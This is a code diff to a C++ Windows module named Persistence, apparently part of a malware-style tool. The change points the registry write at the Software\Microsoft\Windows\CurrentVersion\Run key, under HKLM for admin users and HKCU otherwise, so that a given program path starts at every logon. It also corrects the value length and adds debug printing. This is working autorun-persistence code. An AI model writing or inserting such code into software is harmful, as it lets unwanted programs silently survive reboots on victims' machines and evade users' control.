@@ -23,7 +23,6 @@ INT Persistence::customPersi()
 
 VOID  Persistence::main() 
 {       
-    wstring path_prog = a_path_prog + L'\0'; //don't forget "\0"
     WCHAR value[] = L"" NAME_KEY_REGISTER; 
     wcout << "VALUE: " << value << endl;
     HKEY hKey, HKEY_admin_or_not;
@@ -38,25 +37,29 @@ VOID  Persistence::main()
     {
         //if user is admin
         HKEY_admin_or_not = HKEY_LOCAL_MACHINE;
-        wcscpy(path_of_key, L"SOFTWARE\\WOW6432Node\\Notepad");
+        wcscpy(path_of_key, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+        wcout << HKEY_admin_or_not << endl;
+        wcout << path_of_key << endl;
+        
     }
     else
     {
         //if user not admin
         HKEY_admin_or_not = HKEY_CURRENT_USER;
-        wcscpy(path_of_key, L"Software\\WoW6432Node\\Notepad");
+        wcscpy(path_of_key, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+        wcout << HKEY_admin_or_not << endl;
+        wcout << path_of_key << endl;
     }
 
     if(RegOpenKeyExW(HKEY_admin_or_not,path_of_key, 0, KEY_ALL_ACCESS, &hKey) == 0) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
     {
-        
-        status = RegSetValueExW(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(), sizeof(path_prog.c_str()));
+        wcout << "open " << endl;
+        status = RegSetValueExW(hKey,value ,0 , REG_SZ, (LPBYTE)a_path_prog.c_str(), a_path_prog.size() * sizeof(WCHAR));
         if(status != 0)
         {
             wcout << "error in regservalueex" << endl;
             error = true;
         }
-        
         RegCloseKey(hKey);   
 
     }
@@ -70,7 +73,7 @@ VOID  Persistence::main()
     if(error)
     {
         //defaultPersi(); TO CHANGE
-        ;
+        wcout << "one error persi" << endl; 
     }    
 }
     
